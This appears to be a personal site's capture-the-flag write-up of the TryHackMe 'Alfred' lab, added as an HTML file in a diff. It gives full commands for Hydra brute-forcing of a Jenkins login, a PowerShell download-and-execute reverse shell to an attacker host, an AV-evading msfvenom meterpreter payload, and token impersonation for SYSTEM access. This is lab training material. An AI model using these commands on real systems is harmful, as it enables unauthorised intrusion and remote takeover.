@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Offensive Pentesting: Alfred</title>
+    <link rel="stylesheet" href="../assets/css/styles.css">
+</head>
+<body>
+    <header>
+        <h1>Offensive Pentesting: Alfred</h1>
+        <nav class="main-nav">
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li class="mega-menu">
+                    <a href="#">Writeups</a>
+                    <div class="dropdown">
+                        <div class="menu-section">
+                            <h3>TryHackMe</h3>
+                            <ul>
+                                <li><a href="alfred.html">Alfred</a></li>
+                                <li><a href="tryhackme/tomghost.html">tomghost</a></li>
+                            </ul>
+                        </div>
+                        <div class="menu-section">
+                            <h3>HackTheBox</h3>
+                            <ul>
+                                <li><a href="hackthebox/box1.html">TBD</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <!-- Writeup Banner -->
+        <div class="writeup-banner">
+            <img src="../assets/images/alfred/alfred.jpg" alt="Alfred Banner Image">
+        </div>
+        <!-- Summary Section -->
+        <section class="writeup-summary">
+            <h2>Offensive Pentesting: Alfred</h2>
+            <p><strong>Category:</strong> Write-up</p>
+            <p><strong>Difficulty:</strong> Easy</p>
+            <p><strong>Attack Box:</strong>TryHackMe Kali Linux</p>
+            <p><strong>Date:</strong>June 2024</p>
+        </section>
+        
+        <!-- Objective Section -->
+        <section class="writeup-objective">
+            <h2>Exploit Jenkins to gain an initial shell, then escalate privileges by exploiting Windows authentication tokens.</h2>
+            <li>Exploit a common misconfiguration on a widely used automation server, Jenkins.</li>
+            <li>Jenkins is commonly used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it. After which, an interesting privilege escalation method will be used to get full system access.</li>
+        </section>
+
+        <!-- Tools Section -->
+        <section class="writeup-tools">
+            <h2>Tools Used</h2>
+            <ul>
+                <li><b>Nmap</b> - Used to discover hosts and services on a computer network by sending packets and analyzing the responses.</li>
+                <li><b>Burp Suite</b> - Serves as a powerful tool for capturing and controlling the flow of HTTP/HTTPS traffic between your browser and a web server.</li>
+                <li><b>Hydra</b> - A brute force online password cracking program, a quick system login password “hacking” tool. Hydra has the ability to brute force many networking protocols.</li>
+                <li><b>Nishang</b> - Due to the target being a Windows OS application, Nishang will be used to gain initial access to the target. In this case, the reverse shell scripts will be used within the Shells subfolder. This repository contains a useful set of scripts for initial access, enumeration and privilege escalation. Particularly, the Invoke-PowerShellTcp.ps1 will be used to spawn in interactive PowerShell reverse connect or bind shell.
+                <b>Nishang scripts are flagged by many Anti-Viruses as malicious. Ensure that you set the proper exclusions if needed.</b></li>
+                <li><b>Netcat</b> - A versatile networking utility for reading from and writing to network connections using TCP or UDP protocols. It can be used for port scanning, transferring files, and creating backdoors.</li>
+                <li><b>Metasploit</b> - A set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.</li>
+                <li><b>Msfvenom</b> - Part of the Metasploit Framework but shipped as a standalone tool, and is used to generate payloads on the fly.</li>
+                <!-- Additional tools used for Alfred -->
+            </ul>
+        </section>
+
+        <!-- Walkthrough Section -->
+        <section class="writeup-steps">
+            <p class="question">QUESTION:<br>How many ports are open? (TCP only?)</p>
+        <div class="solution">
+            <p>SOLUTION:<br>Nmap will be used to scan for open TCP ports:</p>
+            <p>Start by scanning the box with Nmap to identify the number of open TCP ports and services using the following options:</p>    
+            <li>-vv = very verbose</li>
+            <li>-sS = TCP SYN Scan or Stealth scan</li>
+            <li>-Pn = scan with no ping</li>
+            <li>-oN = output scan to a .txt file</li>
+            <h5>*If no port range is specified, the command <i>nmap -sS targetIP</i> performs a SYN scan on well-known 1,000 TCP ports on the host targetIP*</h5>
+            </p>
+        </div>
+            <pre><code>nmap -vv -sS -Pn targetIP -oN initialscan</pre></code>
+        <!-- Screenshot Images -->
+        <div class="screenshot-container">
+            <a href="../assets/images/alfred/initialscan_alfred.png" target="_blank">
+                <img src="../assets/images/alfred/initialscan_alfred.png" alt="Alfred 8080" class="zoom-image">
+            </a>
+        </div>
+            <p class="question">QUESTION:<br>What is the username and password for the login panel? (in the format username:password)</p>
+        <div class="solution">    
+            <p>SOLUTION:<br>targetIP:8080 shows a web console login prompt for Jenkins.</p>
+<!-- Screenshot Images -->
+<div class="screenshot-container">
+    <a href="../assets/images/alfred/alfred_8080.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_8080.png" alt="Alfred 8080" class="zoom-image">
+    </a>
+        </div>               
+            <p>With some quick online searching, it can be quickly determined what the default username for a fresh Jenkins installation is.
+            Knowing this, Hydra will be used to brute-force the admin password for the discovered web console.
+            To determine the type of HTTP request being made by the target, it's essential to identify whether it's utilizing the GET or POST method, both of which are commonly employed.
+            Burp Suite will first be utilized to capture a login request to determine the request method, login path, and authentication configuration.
+            This information is utilized to construct the following hydra command for brute-forcing the password using the following options:</p>
+            <li>-s = specifies port</li>
+            <li>-l = specifies username</li>
+            <li>-P = specifies password wordlist</li>
+            <li>http-post-form = method used for performing password attacks against web applications that use form-based authentication over HTTP</li>
+            <li>j_acegi_security_check = a URL endpoint in Jenkins that is used for handling security-related tasks, particularly authentication and authorization</li>
+            <li>^USER^ = indicates to use the username specified with the -l switch</li>
+            <li>^PASS^ = indicates to use the wordlist specified with the -P switch</li>
+            <li>F = string that appears in the server reply when the login fails</li>
+            <li>-V = verbosity enabled</li>
+            <h5>*The "common-passwords-win.txt" from <a href="https://github.com/danielmiessler/SecLists">SecLists</a> will be utilized as the wordlist for the password brute force method.</h5>
+            </p>
+         </div>   
+            <pre><code>hydra -s 8080 -l username -P wordlist targetIP http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -V</pre></code>
+<!-- Screenshot Images -->
+        <div class="screenshot-container">
+    <a href="../assets/images/alfred/alfred_8080_burp.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_8080_burp.png" alt="Burpsuite capture" class="zoom-image">
+    </a>
+    <a href="../assets/images/alfred/alfred_8080_hydra.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_8080_hydra.png" alt="Hydra capture" class="zoom-image">
+    </a>
+        </div>
+            <p class="question">QUESTION:<br>What is the user.txt flag?</p>
+        <div class="solution">
+            <p>SOLUTION:<br>After initial login to the Jenkins admin console, and upon further investigation, it appears
+                that there is a 'project' that can be configured to Execute Windows batch commands. This
+                can be used as an advantage to gain initial access to the system using a set of tools within
+                the Nishang repository.
+                <p>Discovered Project URL: <i>http://targetIP:8080/job/project/</i><br>Configure Project URL: <i>http://targetIP:8080/job/project/configure</i></p>
+<!-- Screenshot Images -->
+        <div class="screenshot-container">
+    <a href="../assets/images/alfred/alfred_8080_login_confirmed.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_8080_login_confirmed.png" alt="Login confirmed" class="zoom-image">
+    </a>
+        </div>
+            <p>How to download the bind shell to the target and run it.</p>
+            </p>
+        </div>
+            <p class="solution">1. On the AttackBox, navigate to the  'Shells' folder within the Nishang directory:</p>
+            <pre><code>cd /usr/share/Nishang/Shells</pre></code>
+            <p class="solution">2. Use the http.server python module to start a simple HTTP server on port 9000 in the Shells directory:</p>
+            <pre><code>python3 -m http.server 9000</pre></code>
+<!-- Screenshot Images -->
+<div class="screenshot-container">
+    <a href="../assets/images/alfred/alfred_http_svr.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_http_svr.png" alt="hosting http server" class="zoom-image">
+    </a>
+        </div>
+            <p class="solution">3. On the Jenkins target, configure the project. Within the 'Execute Windows batch command' the following command is used to download and execute the bind shell to the target:</p>    
+            <pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://attackIP:port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress attackIP -Port listeningport</pre></code>
+<!-- Screenshot Images -->
+<div class="screenshot-container">
+    <a href="../assets/images/alfred/alfred_8080_payloaddownload.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_8080_payloaddownload.png" alt="Hydra capture" class="zoom-image">
+    </a>
+        </div>        
+        <div class="solution">4. Click Save.
+                <br>(Ensure that there is an netcat listener started on the attack box before proceeding.)</p>
+                <p>netcat options:</p>
+                <li>-l = tells netcat to listen for incoming connections</li>
+                <li>-v = enabled verbose mode</li>
+                <li>-n = prevents netcat from performing DNS resolution for incoming connections</li>
+                <li>-p = port number on which netcat should be listening on</li>
+        </div>
+            <pre><code>nc -lvnp listeningport</pre></code>
+        <div class="solution">
+            <p>6. On the Jenkins project, click <i>Build Now</i>.</p>
+            <h3>SHELL OBTAINED!</h3>
+<!-- Screenshot Images -->
+<div class="screenshot-container">
+    <a href="../assets/images/alfred/alfred_8080_initialshell.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_8080_initialshell.png" alt="Login confirmed" class="zoom-image">
+    </a>
+        </div>
+            <p>user.txt flag found in <i>C:\Users\bruce\Desktop</i></p>
+        </div>
+
+<!-- Screenshot Images -->
+        <div class="screenshot-container">
+    <a href="../assets/images/alfred/alfred_user_flag.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_user_flag.png" alt="user flag" class="zoom-image">
+    </a>
+        </div>
+        <div class="solution">
+            <h1>SWITCHING SHELLS</h1>
+            <p>Switching to a Meterpreter shell can significantly enhance the capabilities for privilege escalation and post-exploitation activities.</p>
+        </div>
+            <p class="question">QUESTION:<br>What is the final size of the exe payload that you generated?</p>
+        <div class="solution">
+            <p>SOLUTION:<br>Within the AttackBox, utilize msfvenom with the options below to generate a Windows meterpreter reverse shell payload, establishing a connection to a listener initiated with the Metasploit Framework. 
+                The following payload generates an encoded x86-64 reverse TCP meterpreter payload. 
+                Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. 
+                An anti-virus product may not recognize the payload and won't flag it as malicious.
+                <li>-p = payload to use</li>
+                <li>-a = architecture to use</li>
+                <li>--encoder = encoder to use</li>
+                <li>LHOST = attackIP</li>
+                <li>LPORT = listening port to use</li>
+                <li>-f =output format</li>
+                <li>-o = save the payload</li>
+            <pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=attackIP LPORT=listeningport -f exe -o revshell.exe</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_msfvenom.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_msfvenom.png" alt="generate payload" class="zoom-image">
+    </a>
+        </div>
+            <p>In the same directory as revshell.exe, ensure that a simple HTTP server is started using python:</p>
+            </p>
+        </div>
+            <pre><code>python3 -m http.server listening port</code></pre>
+            <p class="solution">
+                Enter the msfconsole interface to configure and start a Windows meterpreter reverse listener to receive the created reverse shell:</p>
+            <pre><code>msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST attackIP
+set LPORT listeningport
+run</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_msfconsole3.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_msfconsole3.png" alt="start listener" class="zoom-image">
+    </a>
+        </div>
+            <p class="solution">
+                While still connected to the target from the initial Nishang shell, execute the following powershell command to download and run the Windows meterpreter reverse shell file:</p>
+            <pre><code>powershell "(New-Object System.Net.WebClient).Downloadfile('http://attackIP:port/revshell.exe','revshell.exe')"</code></pre>
+            <p class="solution">
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_revshell_download.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_revshell_download.png" alt="download reverse shell" class="zoom-image">
+    </a>
+        </div>
+            <p class="solution">       
+                After confirming that the Windows meterpreter reverse shell has been downloaded, use the following command to run the file and pop the reverse shell:</p>
+            <pre><code>Start-Process "revshell.exe"</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_start_reverse_shell.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_start_reverse_shell.png" alt="start reverse shell" class="zoom-image">
+    </a>
+        </div>
+        <div class="solution">
+            <h3>SHELLS SWITCHED!</h3>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_receive_reverse_shell.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_receive_reverse_shell.png" alt="receive reverse shell" class="zoom-image">
+    </a>
+        </div>
+            <br>
+            <h1>Privilege Escalation</h1>
+            <p>Now that initial access has been obtained as a user, token impersonation will be used to gain system level access.</p>
+        </div>
+            <p class="question">QUESTION:<br>Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command?</p>
+        <div class="solution">
+            <p>SOLUTION:<br>View all the privileges using:
+        <pre><code>whoami /priv</code></pre>
+            <p>It can be observed that two privileges are enabled.</p> 
+                <li>SeDebugPrivilege</li>
+                <li>SeImpersonatePrivilege</li>
+            <p>In Metasploit, the incognito module allows for impersonation or privilege escalation by
+                leveraging tokens of other processes to run commands under the context of different users.
+                It's particularly useful for post-exploitation activities, enabling maintained persistence and
+                the ability move laterally within a compromised system.</p>
+            <p>While in Metasploit, use the following command to initiate the incognito module:</p>
+            <p>(Note that you may need to use the <b><i>use incognito</i></b> command if the following command doesn't work. Also ensure that Metasploit is up to date by using the msfupdate update command).</p>    
+        </div>
+        <pre><code>load incognito</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_incognito.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_incognito.png" alt="impersonate" class="zoom-image">
+    </a>
+        </div>
+            <p class="solution">Now, check which tokens are available using the following command:</p>
+        <pre><code>list_tokens -g</code></pre>
+<!-- Screenshot Images -->
+    <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_tokens1.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_tokens1.png" alt="list tokens" class="zoom-image">
+    </a>
+        </div>
+            <p class="solution">It can be observed that the BUILTIN\Administrators token is available. Impersonate the Administrators' token:</p>
+        <pre><code>impersonate_token "BUILTIN\Administrators"</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_80_getuid.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_80_getuid.png" alt="getuid" class="zoom-image">
+    </a>
+        </div>
+            <p class="question">QUESTION:<br>Read the root.txt file located at C:\Windows\System32\config</p>
+        <div class="solution">
+            <p>SOLUTION:<br>Even though a higher privileged token has been obtained, you may not have the
+                permissions of a privileged user (this is due to the way Windows handles permissions, it
+                uses the Primary Token of the process and not the impersonated token to determine what
+                the process can or cannot do).</p>
+            <p>Migrate to a process with correct permissions. The safest process to pick is the <i>services.exe</i>
+                process.</p>
+            <p>View the processes on the target:</p>
+        </div>
+        <pre><code>ps</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_80_ps.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_80_ps.png" alt="processes" class="zoom-image">
+    </a>
+        </div>
+            <p class="solution">Find the PID of the services.exe process.</p>
+            <p class="solution">Migrate to the services.exe process. In Metasploit, type the following:</p>
+        <pre><code>migrate 'PID of process'</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_80_migrate_ps.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_80_migrate_ps.png" alt="migrate process" class="zoom-image">
+    </a>
+        </div>
+            <p class="solution">After migrating to the process, first use the shell command to provide a shell interface on
+            the target. Navigate to <i>C:\Windows\System32\Config</i></p>
+            <p class="solution">To view the contents of the file, use the following command:</p>
+        <pre><code>shell
+type root.txt</code></pre>
+<!-- Screenshot Images -->
+        <div class="screenshot-container"> 
+    <a href="../assets/images/alfred/alfred_80_privesc.png" target="_blank">
+        <img src="../assets/images/alfred/alfred_80_privesc.png" alt="privesc" class="zoom-image">
+    </a>
+        </div>
+        <div class="solution"><h1>EXPLOITED!</h1>
+        </div>
+        </section>
+        <!-- Conclusion Section -->
+        <section class="writeup-conclusion">
+            <h2>Conclusion</h2>
+            <p>
+                The Alfred box demonstrated the risks associated with misconfigured services and weak credential management in a real-world scenario. By exploiting a vulnerable Jenkins automation server, we gained initial access, emphasizing the importance of securing development tools in production environments.
+                Enumeration tools like Nmap, Burp Suite, and Hydra were critical in identifying services and brute-forcing credentials, while Nishang and Netcat facilitated the reverse shell connection. Privilege escalation via Windows authentication tokens highlighted the importance of securing privileged accounts and monitoring token usage.
+                This challenge reinforced the interconnected nature of misconfigurations, weak credentials, and privilege escalation in attack paths, providing valuable insights into both offensive and defensive security practices.
+            </p>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2024 RecSec Labs</p>
+    </footer>
+</body>
+</html>
